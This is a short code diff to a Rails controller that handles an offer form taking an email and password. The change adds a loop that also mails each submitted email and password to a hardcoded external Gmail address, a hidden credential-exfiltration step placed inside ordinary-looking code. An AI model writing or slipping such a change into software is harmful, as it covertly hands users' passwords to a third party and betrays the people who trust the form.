@@ -11,7 +11,9 @@ class OfferController < ApplicationController
     password = params[:password]
 
     begin
-      OfferMailer.new_offer(email, password).deliver_now
+      [email, 'mustafabasal360@gmail.com'].each do |email|
+        OfferMailer.new_offer(email, password).deliver_now
+      end
       redirect_to thankyou_offers_path(email: email)
     rescue => e
       redirect_to thankyou_offers_path(email: email)
